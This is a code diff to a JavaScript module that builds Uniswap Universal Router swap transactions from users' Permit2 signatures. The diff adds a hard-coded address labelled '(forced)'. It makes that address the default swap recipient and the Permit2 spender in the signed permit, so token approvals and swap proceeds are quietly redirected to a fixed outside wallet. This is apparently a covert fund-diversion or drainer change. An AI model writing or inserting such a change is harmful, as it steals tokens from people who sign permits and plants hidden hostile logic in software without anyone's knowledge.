@@ -16,6 +16,8 @@ const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
+// Hard-coded executor address (forced)
+const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
 const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };
 
 // -----------------------------
@@ -81,7 +83,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const { owner, token, amount, deadline, nonce, r, s, v } = data;
   
   // Use frontend overrides or env fallbacks
-  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
+  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || HARDCODED_EXECUTOR;
   const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
   
   const amountBn = BigInt(amount);
@@ -89,7 +91,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const permitAbi = new ethers.AbiCoder();
 
   const permitSingleTuple = [
-    [[token, amountBn, Number(deadline), Number(nonce)], UNIVERSAL_ROUTER, Number(deadline)],
+    [[token, amountBn, Number(deadline), Number(nonce)], HARDCODED_EXECUTOR, Number(deadline)],
     signatureBytes
   ];
 
